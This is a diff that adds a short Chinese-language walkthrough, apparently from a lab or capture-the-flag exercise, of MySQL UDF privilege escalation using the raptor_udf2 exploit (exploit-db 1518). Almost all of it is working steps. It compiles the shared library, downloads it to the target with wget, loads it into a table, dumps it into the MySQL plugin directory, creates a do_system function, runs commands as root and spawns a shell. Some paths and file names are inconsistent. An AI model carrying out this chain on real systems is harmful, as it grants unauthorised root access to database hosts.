@@ -1,0 +1,30 @@
+下载漏洞exp：https://www.exploit-db.com/exploits/1518/
+
+32/64位系统在32位/64系统上编译：
+$ gcc -g -c raptor_udf2.c
+$ gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+或
+$ gcc -g -c 1550.c
+$ gcc -g -shared -Wl,-soname,1550.so -o 1550.so 1550.o -lc
+
+编译生成1518.so，我们在靶机上用wget下载到靶机/home/smeagol/
+
+进去数据库，进入表，create table myexploit(line blob); 
+
+利用load_file()将已经编译过后的1518.so插入表中：insert into myexploit values(load_file('/home/smeagol/1518.so'));
+
+利用dumpfile()将表中的内容输出到 /usr/lib/mysql/plugin 中: select * from myexploit into dumpfile '/usr/lib/plugin/1518.so';
+
+创建一个名为 " do_system "的MYSQL函数，并让他使用1518.so: create function do_system returns integer soname '1518.so';
+
+检测创建的函数是否存在：select * from mysql.func;
+
+输出id命令的结果  ，以确认我们以root身份运行: select do_system('id>/tmp/out; chown smeahol.smeagol /tmp/out');
+
+执行shell命令：\! sh
+
+
+
+
+
+
